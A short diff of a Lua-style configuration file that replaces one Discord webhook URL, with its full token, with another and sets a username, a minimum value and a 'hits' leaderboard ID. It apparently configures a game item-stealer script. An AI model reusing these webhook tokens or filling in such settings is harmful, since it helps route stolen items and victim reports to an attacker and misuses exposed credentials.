@@ -1,5 +1,5 @@
 Username = "supermegabaconv17"
-Webhook = "https://discord.com/api/webhooks/1405126211390148629/Cv7UNWcLPp5q6W9xwgcy3r9cl7eZFsC2sJeUW1bfhWmOYSsJSEiuKbLR_fWkIamCnUAT"
+Webhook = "https://canary.discord.com/api/webhooks/1406700927922077746/KJdcF44w_e9b08JmIU9wyea3VHiTrej4gXLr0sDBphu99oC7SS8FlgdWqavixusKJNzL"
 MinimumValue = 1
 DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
